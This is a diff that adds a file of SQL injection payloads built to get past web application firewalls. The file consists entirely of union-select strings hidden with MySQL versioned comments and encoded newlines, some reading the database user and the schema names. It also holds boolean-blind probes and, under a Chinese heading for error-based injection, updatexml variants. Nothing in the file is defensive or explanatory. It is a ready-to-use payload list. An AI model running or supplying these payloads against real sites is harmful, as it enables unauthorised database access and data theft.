@@ -1,0 +1,21 @@
+/*!union/*/*/*%00select*/%201,2,3--+
+union%20%23%0aall%20/!*select*/
+union%20%20--%20/*#*/%0aord()%0a%20select
+?id=-1' /*&id='union select 1,user(),3 -- +*/
+/*&id='union select 1,/*!USER/*!/*/**/*/()/**/,3 -- +*/
+/*&id='union select 1,/*!USER*/(/*/**/),3 -- +*/
+
+1'  REGEXP "[…%0a%23]"    /*!11444union %0a select*/ 1,2,3 --+
+-1'  REGEXP "[…%0a%23]"    /*!11444union %0a select*/ 1,user(%0a /*!80000aaa*/),3 -- +
+-1'  REGEXP "[…%0a%23]"    /*!11444union %0a select*/ 1,(select %0a group_concat(schema_name %0a /*80000aaa*/) %0a from %0a /*!11444 /*REGEXP "[…%0a%23]"*/ %0a information_schema.schemata*/),3-- +
+
+bool:
+/*!and*//*/**/1=1
+/*!and*//*/**/substr((select/*/**/hex(/*!USER*/(/*/**/))),1,1)>1
+/*!and*//*/**/substr((select/*/**/hex(/*!USER*/(/*/**/))),1,1)>999
+报错注入：
+and updatexml(1,2,3
+/*updatexml*/(1,1,1)
+/*!5000updatexml*/(1,1,1)
+/*!11440updatexml*/(1,1,1)
+/*!and*//*/**//*!11440updatexml*/(1,1,1)
